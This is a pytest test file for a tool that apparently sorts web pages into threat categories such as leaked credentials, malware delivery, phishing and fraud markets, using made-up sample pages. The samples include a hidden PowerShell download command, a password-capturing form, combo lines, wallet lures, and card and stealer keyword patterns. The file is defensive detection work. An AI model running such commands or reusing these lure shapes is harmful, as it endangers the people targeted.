"""Tests for the category rules (plan/classification-plan-2026-11-15.md).

For each category: pages in the shape the survey counted get the label, and
the nearest wrong shape does not. Every page here is made up in that shape.
None holds a real account, address, key or person, and nothing here reads a
held-out page from known.txt.
"""

import base64

import pytest

from graphwatch.classify import body_hash, classify_page, computed_rules
from graphwatch.rules import (
    CATEGORIES,
    INTELLIGENCE,
    RULES,
    THRESHOLD,
    body_of,
    category_scores,
    labels_for,
    primary_label,
    score,
)
from graphwatch.telegraph import page_text

API_SAMPLE = "Hello,+world!"
SPOOF_TITLE = "www.tenable.com@agfc.harper18.workers.dev/"
SECRET = "SECRET{" + "ab" * 32 + "}"
OTHER_SECRET = "SECRET{" + "cd" * 32 + "}"
FILLER = "nothing of interest in this sentence at all. "


def classify(title: str, body: str, description: str = "", templated: bool = False):
    """The hits for one made-up page, computed rules included."""
    text = page_text({"title": title, "description": description, "content": [body]})
    stored_body = body_of(title, description, text)
    digest = body_hash(stored_body) if templated else None
    return classify_page(title, description, text, computed_rules(stored_body, digest))


def labels(title: str, body: str, description: str = "", templated: bool = False):
    return labels_for(category_scores(classify(title, body, description, templated)))


def fired(hits) -> set[str]:
    return {hit.rule.name for hit in hits}


def b64(s: str) -> str:
    return base64.b64encode(s.encode("utf-8")).decode("ascii")


# --------------------------------------------------------------------------
# the table
# --------------------------------------------------------------------------


def test_there_are_fourteen_categories_in_the_planned_order():
    assert CATEGORIES == (
        "resolver",
        "template_spam",
        "pointer",
        "leaked_credentials",
        "proxy_list",
        "malware_delivery",
        "fraud_market",
        "crypto_lure",
        "phishing",
        "doxx",
        "telegram_funnel",
        "seo_spam",
        "placeholder",
        "prose",
    )


def test_nine_categories_are_intelligence_and_five_are_noise():
    assert len(INTELLIGENCE) == 9
    assert INTELLIGENCE <= set(CATEGORIES)
    assert set(CATEGORIES) - INTELLIGENCE == {
        "template_spam",
        "telegram_funnel",
        "seo_spam",
        "placeholder",
        "prose",
    }


def test_every_category_can_reach_the_threshold():
    # A category whose positive weights sum below 4 could never be a label.
    for category in CATEGORIES:
        best = sum(r.weight for r in RULES if r.category == category and r.weight > 0)
        assert best >= THRESHOLD, category


# --------------------------------------------------------------------------
# resolver: unchanged, and first in the order
# --------------------------------------------------------------------------


def test_the_spoof_page_is_a_resolver_first():
    found = labels(SPOOF_TITLE, API_SAMPLE, API_SAMPLE)
    assert found[0] == "resolver"
    assert primary_label(found) == "resolver"


def test_a_combo_dump_is_not_a_resolver():
    body = "\n".join(f"user{n}@mail.example.com:{SECRET}" for n in range(5))
    hits = classify("Accounts", body)
    assert score(hits) < THRESHOLD
    assert "resolver" not in labels_for(category_scores(hits))


# --------------------------------------------------------------------------
# template_spam
# --------------------------------------------------------------------------

SQUATTER_BODY = (
    "https://t.me/+YztOEovieQIzZjY8 exploits, malware, RATs, steallers and other "
    "stuff https://t.me/+YztOEovieQIzZjY8 https://t.me/+YztOEovieQIzZjY8"
)


def test_a_templated_advert_is_template_spam_whatever_words_it_uses():
    found = labels("Cobalt-Strike", SQUATTER_BODY, templated=True)
    assert primary_label(found) == "template_spam"


def test_the_same_advert_under_one_title_is_not_template_spam():
    assert "template_spam" not in labels("Cobalt-Strike", SQUATTER_BODY)


# --------------------------------------------------------------------------
# pointer
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "body",
    [
        "8.8.8.8",
        "8.8.8.8:8443",
        "updates.example-cdn.com",
        "updates.example-cdn.com:8443",
        "https://updates.example-cdn.com",
        "http://updates.example-cdn.com:8080/",
        "abc123.trycloudflare.com\n",
    ],
)
def test_a_body_that_is_one_address_is_a_pointer(body):
    assert "pointer" in labels("note", body)


@pytest.mark.parametrize(
    "body",
    [
        "https://t.me/somenews",
        "https://pin.example.com/abc123",
        "https://img.example.com/i/photo.png",
        "https://updates.example-cdn.com/gate",
        "https://updates.example-cdn.com/#top",
    ],
)
def test_a_body_that_is_one_link_to_a_page_is_not_a_pointer(body):
    # Decided 22 November: a pointer is a server address, not a link to share.
    hits = classify("note", body)
    assert "bare_pointer_body" not in fired(hits)
    assert "pointer" not in labels_for(category_scores(hits))


def test_an_encoded_address_posted_through_the_api_is_a_pointer():
    body = b64("https://updates.example-cdn.com/gate")  # encoded, a path does not matter
    hits = classify("note", body, API_SAMPLE)
    assert {"encoded_body", "api_sample_page"} <= fired(hits)
    assert "pointer" in labels_for(category_scores(hits))


def test_an_encoded_body_alone_is_a_near_miss():
    scores = category_scores(classify("note", b64("just some ordinary words")))
    assert scores["pointer"] == 3


def test_a_dating_autologin_url_is_not_a_pointer():
    body = f"https://m.dating.example.com/autologin/?key={SECRET}&loc=en"
    found = labels("Katya", body)
    assert "pointer" not in found
    assert "leaked_credentials" in found


def test_a_url_with_a_query_string_is_not_a_bare_pointer():
    hits = classify("note", "https://shop.example.com/item?id=12345")
    assert "bare_pointer_body" not in fired(hits)


def test_a_long_tracking_url_takes_the_penalty():
    body = "https://click.example.com/r?campaign=" + "a1b2c3d4" * 4
    hits = classify("note", body)
    assert "tracking_url_body" in fired(hits)
    assert category_scores(hits)["pointer"] < 0


def test_an_address_inside_a_sentence_is_not_a_pointer():
    assert "pointer" not in labels("note", "the resolver at 8.8.8.8 is run by Google")


def test_an_ip_in_a_long_body_is_not_a_pointer():
    assert "pointer" not in labels("note", FILLER * 6 + "8.8.8.8")


def test_a_private_address_is_not_a_pointer():
    assert "pointer" not in labels("note", "192.168.1.64")


def test_an_ordinary_word_is_not_an_encoded_body():
    assert "encoded_body" not in fired(classify("note", "Congratulations"))


# --------------------------------------------------------------------------
# leaked_credentials
# --------------------------------------------------------------------------


def test_a_combo_list_is_leaked_credentials():
    body = "\n".join(f"user{n}@mail.example.com:{SECRET}" for n in range(3))
    hits = classify("Accounts", body)
    assert "combo_lines" in fired(hits)
    assert primary_label(labels_for(category_scores(hits))) == "leaked_credentials"


def test_two_combo_lines_are_not_a_list():
    body = "\n".join(f"user{n}@mail.example.com:{SECRET}" for n in range(2))
    assert "combo_lines" not in fired(classify("Accounts", body))


def test_combo_lines_are_counted_in_the_body_not_twice_through_the_description():
    # The description repeats the first lines of the body.
    body = "\n".join(f"user{n}@mail.example.com:{SECRET}" for n in range(2))
    assert "combo_lines" not in fired(classify("Accounts", body, description=body))


def test_a_telegram_session_export_is_leaked_credentials():
    body = f'WARNING_BANNER\n"dc2_auth_key": "{SECRET}",\n"user_auth": 1'
    assert "leaked_credentials" in labels("session", body)


def test_a_telegram_api_pair_is_leaked_credentials():
    body = f"api_id: 1234567\napi_hash: {SECRET}"
    assert "leaked_credentials" in labels("config", body)


def test_an_api_id_without_its_hash_is_not():
    assert "leaked_credentials" not in labels("config", "api_id: 1234567")


@pytest.mark.parametrize(
    "link",
    [
        f"https://m.dating.example.com/autologin/?key={SECRET}",
        f"https://dating.example.com/in?u=7&token={SECRET}",
    ],
)
def test_a_login_link_is_leaked_credentials(link):
    assert "leaked_credentials" in labels("Katya", f"write to me {link}")


def test_a_hashed_token_in_a_path_is_a_near_miss_alone():
    # Decided 22 November: a numeric id hashed as a card number looks the same.
    hits = classify("Katya", f"write to me https://dating.example.com/l/{SECRET}/open")
    assert "token_in_path" in fired(hits)
    assert "autologin_link" not in fired(hits)
    assert category_scores(hits)["leaked_credentials"] == 2


def test_a_hashed_token_in_a_path_counts_beside_another_credential_rule():
    body = "\n".join(f"https://dating.example.com/l/{SECRET}/open?n={n} pwd: {OTHER_SECRET}" for n in range(3))
    hits = classify("Katya", body)
    assert {"token_in_path", "some_secrets"} <= fired(hits)
    assert "leaked_credentials" in labels_for(category_scores(hits))


def test_a_hashed_value_in_a_query_is_not_a_token_in_the_path():
    hits = classify("x", f"https://shop.example.com/item?ref=/{SECRET}")
    assert "token_in_path" not in fired(hits)


def test_ten_hashed_secrets_are_leaked_credentials():
    body = "\n".join(f"panel{n} password: {SECRET}" for n in range(10))
    hits = classify("logins", body)
    assert {"many_secrets", "some_secrets"} <= fired(hits)
    assert "leaked_credentials" in labels_for(category_scores(hits))


def test_secrets_behind_a_bare_word_and_colon_are_not_counted():
    # The movie-link shape: redaction hashed the value of Size:400MB.
    body = "\n".join(f"Size:{SECRET} Quality:{OTHER_SECRET}" for _ in range(8))
    hits = classify("Movie 2026", body)
    assert not {"many_secrets", "some_secrets"} & fired(hits)


def test_secrets_behind_a_password_label_and_colon_are_counted():
    body = "\n".join(f"panel{n} password:{SECRET} db_pass:{OTHER_SECRET}" for n in range(5))
    assert "many_secrets" in fired(classify("logins", body))


def test_email_password_lines_are_left_to_combo_lines():
    body = "\n".join(f"user{n}@mail.example.com:{SECRET}" for n in range(12))
    hits = classify("Accounts", body)
    assert "combo_lines" in fired(hits)
    assert "many_secrets" not in fired(hits)


def test_the_evidence_of_a_counted_secret_is_the_first_one_that_counts():
    body = f"Size:{SECRET}\n" + "\n".join(f"key {OTHER_SECRET}" for _ in range(3))
    hit = next(h for h in classify("x", body) if h.rule.name == "some_secrets")
    assert (hit.evidence, hit.matches) == (OTHER_SECRET, 3)


def test_three_hashed_secrets_are_a_near_miss():
    body = "\n".join(f"panel{n} password: {SECRET}" for n in range(3))
    scores = category_scores(classify("logins", body))
    assert scores["leaked_credentials"] == 2


def test_the_resolver_pages_own_storage_keys_are_not_a_leak():
    title = f"8.8.8.8?a.example.com@b.example.org/!{SECRET}?{OTHER_SECRET}?dGViaQ=="
    assert "leaked_credentials" not in labels(title, API_SAMPLE, API_SAMPLE)


# --------------------------------------------------------------------------
# proxy_list
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "body",
    [
        f"vless://{SECRET}@vpn.example.org:443?security=tls#home",
        f"vmess://{SECRET}@vpn.example.org:443",
        "socks5://8.8.8.8:1080",
        "8.8.8.8:1080\n1.1.1.1:3128\n9.9.9.9:8080",
        f"https://t.me/proxy?server=8.8.8.8&port=443&secret={SECRET}",
        f"tg://proxy?server=p.example.org&port=443&secret={SECRET}",
    ],
)
def test_proxy_endpoints_are_a_proxy_list(body):
    assert "proxy_list" in labels("free proxy", "fresh today:\n" + body)


def test_one_ip_port_is_not_a_proxy_list():
    hits = classify("api", "Test configuration: 149.154.167.40:443 DC 2")
    assert "single_ip_port" in fired(hits)
    assert "proxy_list" not in labels_for(category_scores(hits))


def test_private_ip_ports_are_not_a_proxy_list():
    body = "192.168.1.1:8080\n10.0.0.1:3128\n127.0.0.1:9050"
    assert "proxy_list" not in labels("notes", body)


def test_a_websocket_url_is_not_a_proxy_link():
    assert "proxy_uri" not in fired(classify("docs", "connect to wss://example.com/ws"))


def test_a_long_proxy_list_is_not_leaked_credentials():
    # Each link's user id is hashed, but it is a proxy and not an account.
    body = "\n".join(
        f"vless://{SECRET}@vpn{n}.example.org:443?security=tls" for n in range(12)
    )
    found = labels("free vpn", body)
    assert primary_label(found) == "proxy_list"
    assert "leaked_credentials" not in found


def test_a_proxy_client_config_is_a_near_miss():
    body = '{"server": "vpn.example.org", "port": 443, "method": "aes-256-gcm"}'
    scores = category_scores(classify("config", body))
    assert scores["proxy_list"] == 2


# --------------------------------------------------------------------------
# malware_delivery
# --------------------------------------------------------------------------


@pytest.mark.parametrize("extension", ["exe", "apk", "msi", "scr", "ps1", "lnk", "hta", "iso"])
def test_a_link_to_an_executable_is_malware_delivery(extension):
    body = f"download https://files.example.com/setup.{extension} and run it"
    assert "malware_delivery" in labels("Update", body)


def test_a_run_command_with_a_file_host_is_malware_delivery():
    body = "powershell -w hidden iwr https://mega.nz/file/abc -o a.dat"
    assert "malware_delivery" in labels("fix", body)


def test_an_archive_link_alone_is_a_near_miss():
    scores = category_scores(classify("book", "https://files.example.com/book.zip"))
    assert scores["malware_delivery"] == 2


def test_a_link_to_a_page_about_executables_is_not_one():
    body = "read https://example.com/what-is-an.exe-file/ for more"
    assert "executable_link" not in fired(classify("help", body))


# --------------------------------------------------------------------------
# fraud_market
# --------------------------------------------------------------------------

ONION = "a2b3c4d5e6f7g2h3" + ".onion"


def test_a_market_mirror_with_card_terms_is_fraud_market():
    body = f"fresh cvv and fullz, mirror: http://{ONION}/shop"
    assert "fraud_market" in labels("shop", body)


def test_carding_and_stealer_terms_together_are_fraud_market():
    assert "fraud_market" in labels("logs", "carding guide, redline logs for sale")


def test_a_stealer_word_alone_is_a_near_miss():
    scores = category_scores(classify("news", "a new stealer was found in the wild"))
    assert scores["fraud_market"] == 2


def test_cvv_inside_another_word_is_not_a_card_term():
    assert "card_terms" not in fired(classify("x", "the xcvvz model number"))


# --------------------------------------------------------------------------
# crypto_lure
# --------------------------------------------------------------------------

ETH_ADDRESS = "0x" + "a1" * 20


def test_an_airdrop_with_a_wallet_address_is_a_crypto_lure():
    body = f"claim the airdrop, send gas to {ETH_ADDRESS}"
    assert "crypto_lure" in labels("claim", body)


def test_a_wallet_address_alone_is_a_near_miss():
    scores = category_scores(classify("donate", f"donations: {ETH_ADDRESS}"))
    assert scores["crypto_lure"] == 2


def test_the_word_airdrop_alone_is_a_near_miss():
    scores = category_scores(classify("news", "the airdrop happens next week"))
    assert scores["crypto_lure"] == 3


# --------------------------------------------------------------------------
# phishing
# --------------------------------------------------------------------------


def test_the_source_of_a_login_form_is_phishing():
    body = '<form action="post.php"><input name="p" type="password"></form>'
    assert "phishing" in labels("PayPal", body)


def test_a_free_host_link_through_a_shortener_is_a_near_miss():
    body = "verify at https://login-check.pages.dev or https://bit.ly/3abcde"
    scores = category_scores(classify("support", body))
    assert scores["phishing"] == 3


def test_a_text_input_is_not_a_login_form():
    assert "phishing" not in labels("form", '<input name="q" type="text">')


# --------------------------------------------------------------------------
# doxx: counted, never excerpted, so these pages are field names and zeros
# --------------------------------------------------------------------------


def test_two_identity_fields_are_a_doxx():
    body = "паспорт: 0000 000000\nдата рождения: 00.00.0000"
    assert "doxx" in labels("x", body)


def test_one_identity_field_is_a_near_miss():
    scores = category_scores(classify("x", "нужен паспорт для регистрации"))
    assert scores["doxx"] == 2


def test_the_same_field_twice_is_still_one_field():
    scores = category_scores(classify("x", "паспорт старый, паспорт новый"))
    assert scores["doxx"] == 2


# --------------------------------------------------------------------------
# telegram_funnel
# --------------------------------------------------------------------------


def test_an_invite_link_with_a_bot_link_is_a_telegram_funnel():
    body = "join https://t.me/+AbCdEfGhIjKlMnOp or write https://t.me/some_shop_bot"
    assert "telegram_funnel" in labels("shop", body)


def test_an_adult_advert_with_an_invite_and_a_handle_is_a_telegram_funnel():
    body = "слив в канале https://t.me/+AbCdEfGhIjKlMnOp пиши @some_handle"
    assert "telegram_funnel" in labels("Kristina", body)


def test_a_plain_channel_link_is_not_a_telegram_funnel():
    assert "telegram_funnel" not in labels("news", "our channel: https://t.me/somenews")


def test_an_email_address_is_not_a_telegram_handle():
    assert "telegram_handle" not in fired(classify("x", "mail me at someone@example.com"))


# --------------------------------------------------------------------------
# seo_spam
# --------------------------------------------------------------------------


@pytest.mark.parametrize("host", ["mdisk.me/convertor/1x2", "teraboxapp.com/s/1abc"])
def test_a_movie_link_page_is_seo_spam(host):
    assert "seo_spam" in labels("Movie 2026", f"watch online https://{host}")


def test_a_casino_brand_alone_is_a_near_miss():
    scores = category_scores(classify("bonus", "бонус в казино каждый день"))
    assert scores["seo_spam"] == 3


# --------------------------------------------------------------------------
# placeholder
# --------------------------------------------------------------------------


@pytest.mark.parametrize("body", ["", "ok", "   \n  ", "x" * 19])
def test_a_body_under_twenty_characters_is_a_placeholder(body):
    assert "placeholder" in labels("Test", body)


def test_a_body_of_twenty_characters_is_not_a_placeholder():
    assert "placeholder" not in labels("Test", "x" * 20)


def test_an_api_test_page_is_a_placeholder_and_not_a_pointer():
    found = labels("Hello", API_SAMPLE, API_SAMPLE)
    assert found == ["placeholder"]


# --------------------------------------------------------------------------
# prose
# --------------------------------------------------------------------------


def test_a_long_text_with_no_link_is_prose():
    assert labels("Story", FILLER * 80) == ["prose"]


def test_a_long_text_with_a_link_is_not_prose():
    assert "prose" not in labels("Story", FILLER * 80 + " https://example.com/more")


def test_a_long_text_with_a_telegram_link_is_not_prose():
    assert "prose" not in labels("Story", FILLER * 80 + " t.me/somenews")


def test_three_thousand_characters_exactly_is_not_prose():
    assert "prose" not in labels("Story", "x" * 3000)


# --------------------------------------------------------------------------
# primary label and pages with two labels
# --------------------------------------------------------------------------


def test_a_page_keeps_every_label_it_earns():
    body = "\n".join(f"user{n}@mail.example.com:{SECRET}" for n in range(3))
    body += "\nwatch https://teraboxapp.com/s/1abc"
    found = labels("Accounts", body)
    assert {"leaked_credentials", "seo_spam"} <= set(found)


def test_the_primary_label_is_the_first_in_category_order():
    body = "\n".join(f"user{n}@mail.example.com:{SECRET}" for n in range(3))
    body += "\nwatch https://teraboxapp.com/s/1abc"
    assert primary_label(labels("Accounts", body)) == "leaked_credentials"


def test_template_spam_outranks_every_category_but_resolver():
    body = "\n".join(f"user{n}@mail.example.com:{SECRET}" for n in range(3))
    found = labels("Accounts", body, templated=True)
    assert {"template_spam", "leaked_credentials"} <= set(found)
    assert primary_label(found) == "template_spam"


def test_an_ordinary_page_has_no_label():
    found = labels("Meeting notes", "We met on Tuesday and agreed to meet again.")
    assert found == []
    assert primary_label(found) is None


# --------------------------------------------------------------------------
# what the review of 22 November found in the category rules
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "body",
    [
        "new laptop review https://www.msi.com/Laptop/Example-15 is out",
        "listen https://someartist.lnk.to/newalbum",
        "the standard https://www.iso.org/standard/12345.html",
        "docs https://docs.example.com/a.zip.html and https://my.rar.example.org/",
        "https://example.com/setup.exe/readme",
    ],
)
def test_an_extension_in_the_hostname_or_mid_path_is_not_a_file_link(body):
    hits = classify("review", body)
    assert not {"executable_link", "archive_link"} & fired(hits)
    assert "malware_delivery" not in labels_for(category_scores(hits))


@pytest.mark.parametrize(
    "link",
    [
        "https://files.example.com/setup.exe",
        "https://files.example.com/setup.EXE?dl=1",
        "https://files.example.com/a/b/tool.msi#frag",
        "(https://files.example.com/setup.exe).",
        "https://files.example.com/setup.exe, then run it",
    ],
)
def test_a_url_whose_path_ends_in_the_extension_is_a_file_link(link):
    assert "executable_link" in fired(classify("Update", f"get {link}"))


def test_two_file_links_are_two_matches():
    body = "https://a.example.com/x.exe and https://b.example.com/y.apk and https://c.example.com/page"
    hit = next(h for h in classify("Update", body) if h.rule.name == "executable_link")
    assert (hit.evidence, hit.matches) == ("https://a.example.com/x.exe", 2)


def test_hashed_url_credentials_are_not_a_token_in_the_path():
    assert "token_in_path" not in fired(classify("x", f"http://{SECRET}@8.8.8.8:8080/list"))


def test_a_login_parameter_in_a_fragment_is_an_autologin_link():
    assert "autologin_link" in fired(classify("x", f"https://d.example.com/#access_token={SECRET}"))


def test_a_telegram_proxy_link_without_a_server_is_not_one():
    hits = classify("x", "server= is missing here: https://t.me/proxy?port=443")
    assert "telegram_proxy_link" not in fired(hits)


def test_an_input_tag_counts_only_when_it_is_a_password_field():
    body = '<input name="user" type="text"><input name="p" type="password"><input type=PASSWORD>'
    hit = next(h for h in classify("form", body) if h.rule.name == "login_form_source")
    assert hit.matches == 2


def test_a_body_with_whitespace_after_a_long_url_is_not_a_tracking_url_body():
    body = "https://example.com/r?d=" + "a1b2c3d4" * 400 + "\nsee you there"
    assert "tracking_url_body" not in fired(classify("note", body))


ADVERSARIAL_PAGES = {
    "tracking url then text": "https://example.com/r?d=" + "aB3-" * 15000 + "\nsee you there",
    "http:// repeated": "http://" * 9100,
    "https://a. repeated": "https://a." * 6400,
    "<input repeated": "<input" * 10600,
    "proxy link repeated": "server= " + "t.me/proxy?" * 5800,
    "t.me/ repeated": "t.me/" * 12800,
    "at signs": "@" * 64000,
    "scheme separators": "://" * 21000,
    "markers": "SECRET{" * 9100,
    "storage markers": "/!" * 32000,
    "api_hash repeated": "api_hash" * 8000,
    ".onion repeated": ".onion" * 10600,
    "quotes and colons": '":' * 32000,
    "one long line of words": "word " * 12800,
}


@pytest.mark.parametrize("name", sorted(ADVERSARIAL_PAGES))
def test_classifying_one_crafted_page_takes_well_under_a_second(name, laptop_seconds):
    # A page is up to 64 KB and whoever posts it chooses every character. The
    # first shape took 54 seconds at 4,000 characters before 22 November, and
    # the next four about ten seconds each at this size.
    body = ADVERSARIAL_PAGES[name]
    assert laptop_seconds(lambda: classify("Title", body, description=body[:300])) < 1.0, name
